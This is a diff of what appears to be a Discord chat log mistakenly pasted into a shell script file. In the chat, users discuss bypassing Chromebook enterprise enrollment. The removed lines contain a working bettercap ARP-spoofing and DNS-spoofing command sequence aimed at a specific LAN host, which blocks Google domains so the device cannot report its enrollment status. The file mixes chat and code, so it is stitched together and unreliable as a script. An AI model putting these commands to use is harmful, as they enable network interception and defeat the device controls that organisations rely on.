@@ -2,29 +2,7 @@ trollmeight
 trollmeight
 Code
 
-trollmeight [BLOX],  — 3:38 PM
-should i test the exploit once again
-set net.probe.throttle 50
-net.probe on
-
-set arp.spoof.targets 192.168.1.243
-set arp.spoof.fullduplex true
-arp.spoof on
-
-set dns.spoof.all false
-set dns.spoof.address 0.0.0.0
-set dns.spoof.domains .google.com,.googleapis.com
-
-dns.spoof on
-events.stream on
-current capfile
-Pers [fluf],  — 3:38 PM
-i also decided to make the gbb script separate from the utility script because my brain was starting to hurt
-also bc some people might want it seperate
 trollmeight [BLOX],  — 3:39 PM
-el thinkpad you only have 10 more years of operating don't give up et
-ok lets go
-it loaded
 powerwash time
 btw i think you have to run the script on your pc before your chromebook boots
 so it doesn't send the enrollment status immediately
@@ -221,6 +199,17 @@ xyprint() {
 tetris.sh
 17 KB
 so i can add it to the script
+this is very important trust
+trollmeight [BLOX],  — 4:08 PM
+holy fuck 😭
+alr
+Pers [fluf],  — 4:08 PM
+not mine btw
+trollmeight [BLOX],  — 4:08 PM
+yea ik but look at the lines of code
+https://raw.githubusercontent.com/trollmeight/webpage/refs/heads/main/ferrochrome/vt2/tetris.sh
+LOL I JUST PASTED OUR ENTIRE CONVO
+WHOOPS
 ﻿
 #!/bin/bash
 
